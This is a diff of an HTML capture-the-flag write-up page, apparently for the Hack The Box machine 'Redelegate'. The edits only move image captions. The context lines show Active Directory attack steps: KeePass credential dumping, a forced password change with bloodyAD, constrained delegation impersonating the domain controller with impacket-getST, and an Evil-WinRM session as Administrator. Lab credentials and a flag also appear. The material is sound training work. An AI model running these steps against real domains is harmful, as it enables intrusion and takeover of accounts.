@@ -393,8 +393,6 @@
       
         
       
-        
-      
     
     
     
@@ -1054,7 +1052,7 @@
 
   <h1>Redelegate</h1>
 
-<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251029225945.png" data-desc-position="bottom"><img alt="Pasted_image_20251029225945.png" src="../../../../Pasted_image_20251029225945.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251029225945.png" data-desc-position="top"><img alt="Pasted_image_20251029225945.png" src="../../../../Pasted_image_20251029225945.png"></a></p>
 <h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">¶</a></h2>
 <div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/redelegate<span class="o">]</span>
 └─$<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.129.234.50
@@ -1316,9 +1314,9 @@ Session<span class="w"> </span>completed.<span class="w"> </span>
 └─$<span class="w"> </span>keepass2<span class="w"> </span>Shared.kdbx
 </code></pre></div>
 <p>Lets open up the <code>Shared.kdbx</code> using <code>keepass</code></p>
-<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251029234334.png" data-desc-position="bottom"><img alt="Pasted_image_20251029234334.png" src="../../../../Pasted_image_20251029234334.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251029234334.png" data-desc-position="top"><img alt="Pasted_image_20251029234334.png" src="../../../../Pasted_image_20251029234334.png"></a></p>
 <p>There are a number of folders (IT, Helpdesk, Finance), and each one has a number of stored credentials.</p>
-<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251029234554.png" data-desc-position="bottom"><img alt="Pasted_image_20251029234554.png" src="../../../../Pasted_image_20251029234554.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251029234554.png" data-desc-position="top"><img alt="Pasted_image_20251029234554.png" src="../../../../Pasted_image_20251029234554.png"></a></p>
 <p>Here is what I collected:</p>
 <div class="highlight"><pre><span></span><code>### IT
 FTP:FTPUser:SguPZBKdRyxWzvXRWy6U:deprecated
@@ -1804,14 +1802,14 @@ Logging<span class="w"> </span>directory<span class="w"> </span>is<span class="w
 <span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Get-DomainObject<span class="w"> </span>-LDAPFilter<span class="w"> </span><span class="s1">'(&amp;(objectclass=*)(objectsid=S-1-5-21-3745110700-3336928118-3915974013-1109))'</span>
 </code></pre></div>
 <p>If I analyze through the web interface, I noticed that RID 1109 does exist:
-<a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030113607.png" data-desc-position="bottom"><img alt="Pasted_image_20251030113607.png" src="../../../../Pasted_image_20251030113607.png"></a></p>
+<a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030113607.png" data-desc-position="top"><img alt="Pasted_image_20251030113607.png" src="../../../../Pasted_image_20251030113607.png"></a></p>
 <p>However upon closer inspection, the SID doesn't match up:
 </p><div class="highlight"><pre><span></span><code>S-1-5-21-4024337825-2033394866-2055507597-1109  (James.Dinkleberg)
 S-1-5-21-3745110700-3336928118-3915974013-1109  (??? not even same domain)
 </code></pre></div><p></p>
 <p>Probably that is a SID from the machine-local domain (workgroup).</p>
 <p>However, I found my controlled user is a member of the <code>HelpDesk</code> group:</p>
-<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030114432.png" data-desc-position="bottom"><img alt="Pasted_image_20251030114432.png" src="../../../../Pasted_image_20251030114432.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030114432.png" data-desc-position="top"><img alt="Pasted_image_20251030114432.png" src="../../../../Pasted_image_20251030114432.png"></a></p>
 <p>That gives me two separate SIDs to be on the lookout for, in DACLs:</p>
 <div class="highlight"><pre><span></span><code>╭─LDAP─<span class="o">[</span>dc.redelegate.vl<span class="o">]</span>─<span class="o">[</span>REDELEGATE<span class="se">\M</span>arie.Curie<span class="o">]</span>-<span class="o">[</span>NS:&lt;auto&gt;<span class="o">]</span><span class="w"> </span><span class="o">[</span>WEB<span class="o">]</span>
 ╰─PV<span class="w"> </span>❯<span class="w"> </span>Get-DomainUser<span class="w"> </span>-Identity<span class="w"> </span>marie.curie<span class="w"> </span>-Properties<span class="w"> </span>cn,ObjectSid
@@ -1873,14 +1871,14 @@ objectSid<span class="w">     </span>:<span class="w"> </span>S-1-5-21-402433782
 <p>At any rate, Bloodhound collection is worth investigating.</p>
 <h3 id="bloodhound-analysis">Bloodhound analysis<a class="headerlink" href="#bloodhound-analysis" title="Permanent link">¶</a></h3>
 <p>In fact, <code>marie.curie</code> has just that <code>ForceChangePassword</code> Outbound Object Control over a number of user accounts:</p>
-<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030123838.png" data-desc-position="bottom"><img alt="Pasted_image_20251030123838.png" src="../../../../Pasted_image_20251030123838.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030123838.png" data-desc-position="top"><img alt="Pasted_image_20251030123838.png" src="../../../../Pasted_image_20251030123838.png"></a></p>
 <p>Another point of interest, but <code>Helen.Frost</code> is a member of <code>Remote Management Users</code> (which means WinRM), and also a member of <code>IT</code>, which has <code>GenericAll</code> over <code>FS01$</code>.  The following cipher query embodies both of those connections.</p>
 <div class="highlight"><pre><span></span><code>match p1=((u:User {name:"HELEN.FROST@REDELEGATE.VL"})-[r:MemberOf]-&gt;(g:Group)) 
 match p2=((g2:Group {name:"IT@REDELEGATE.VL"})-[r2:GenericAll]-&gt;(c:Computer))
 WHERE (g.name = "REMOTE MANAGEMENT USERS@REDELEGATE.VL" or g.name = "IT@REDELEGATE.VL")
 return p1, p2
 </code></pre></div>
-<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030131518.png" data-desc-position="bottom"><img alt="Pasted_image_20251030131518.png" src="../../../../Pasted_image_20251030131518.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030131518.png" data-desc-position="top"><img alt="Pasted_image_20251030131518.png" src="../../../../Pasted_image_20251030131518.png"></a></p>
 <h2 id="take-control-of-helenfrost">Take control of helen.frost<a class="headerlink" href="#take-control-of-helenfrost" title="Permanent link">¶</a></h2>
 <p>Change <code>helen.frost</code>'s password using <code>bloodyAD</code></p>
 <p><a href="https://github.com/CravateRouge/bloodyAD">https://github.com/CravateRouge/bloodyAD</a></p>
@@ -1968,11 +1966,11 @@ Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class
 <span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Probably<span class="w"> </span>SPN<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>allowed<span class="w"> </span>to<span class="w"> </span>delegate<span class="w"> </span>by<span class="w"> </span>user<span class="w"> </span>fs01$<span class="w"> </span>or<span class="w"> </span>initial<span class="w"> </span>TGT<span class="w"> </span>not<span class="w"> </span>forwardable
 </code></pre></div>
 <p>That is because the <code>Administrator</code> user account is marked with the <code>NOT_DELEGATED</code> flag in its <code>userAccountControl</code>, so its TGTs are not forwardable.   Therefore, the user account can't be used in any delegation scenario.</p>
-<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030162008.png" data-desc-position="bottom"><img alt="Pasted_image_20251030162008.png" src="../../../../Pasted_image_20251030162008.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030162008.png" data-desc-position="top"><img alt="Pasted_image_20251030162008.png" src="../../../../Pasted_image_20251030162008.png"></a></p>
 <p>the <code>michael.pontiac</code> user doesn't have that problem.</p>
-<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030162902.png" data-desc-position="bottom"><img alt="Pasted_image_20251030162902.png" src="../../../../Pasted_image_20251030162902.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030162902.png" data-desc-position="top"><img alt="Pasted_image_20251030162902.png" src="../../../../Pasted_image_20251030162902.png"></a></p>
 <p>Same goes for the DC</p>
-<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030165116.png" data-desc-position="bottom"><img alt="Pasted_image_20251030165116.png" src="../../../../Pasted_image_20251030165116.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030165116.png" data-desc-position="top"><img alt="Pasted_image_20251030165116.png" src="../../../../Pasted_image_20251030165116.png"></a></p>
 <p>Perform constrained delegation, impersonating the DC</p>
 <div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/redelegate<span class="o">]</span>
 └─$<span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/fs01<span class="se">\$</span>.ccache<span class="w"> </span>impacket-getST<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>redelegate.vl/fs01<span class="se">\$</span><span class="w"> </span>-spn<span class="w"> </span><span class="s2">"cifs/dc.redelegate.vl"</span><span class="w"> </span>-impersonate<span class="w"> </span>dc<span class="se">\$</span>
@@ -2024,7 +2022,7 @@ Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class
 <span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">type </span><span class="p">..\</span><span class="n">desktop</span><span class="p">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
 <span class="n">ee25f5b2f6aa6fa97f16e75b1db43431</span>
 </code></pre></div>
-<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030164855.png" data-desc-position="bottom"><img alt="Pasted_image_20251030164855.png" src="../../../../Pasted_image_20251030164855.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251030164855.png" data-desc-position="top"><img alt="Pasted_image_20251030164855.png" src="../../../../Pasted_image_20251030164855.png"></a></p>
 
 
 
